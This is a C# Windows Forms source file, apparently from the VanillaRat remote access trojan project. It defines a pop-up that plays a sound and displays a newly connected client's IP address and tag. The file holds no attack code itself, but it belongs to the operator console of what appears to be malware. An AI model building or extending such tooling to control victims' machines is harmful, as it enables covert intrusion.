using System;
using System.Media;
using System.Threading.Tasks;
using VanillaRat.Classes;
using VanillaRat.Properties;

namespace VanillaRat.Forms
{
    public partial class
        NotificationBox : Notification //TO EDIT THIS FORM INHERIT REGULAR FORM FIRST ELSE IT WILL NOT DISPLAY IN DESIGNER
    {
        public NotificationBox()
        {
            InitializeComponent();
            Opacity = 0;
        }

        public string IP { get; set; }

        public string ClientTag { get; set; }

        //Fade form in
        private async void FadeIn(int UpdateInterval)
        {
            try
            {
                while (Opacity < 1.0)
                {
                    await Task.Delay(UpdateInterval);
                    Opacity += 0.05;
                }

                Opacity = 1;
            }
            catch { }
        }

        //On notification box load
        private void NotificationBox_Load(object sender, EventArgs e)
        {
            SoundPlayer SP = new SoundPlayer(Resources.Click_Soft_00);
            SP.Play();
            lblClientTag.Text = ClientTag.ToUpper();
            lblIP.Text = IP.ToUpper();
            FadeIn(15);
        }

        //On notification box show
        private async void NotificationBox_Shown(object sender, EventArgs e)
        {
            await Task.Delay(3000);
            Close();
        }
    }
}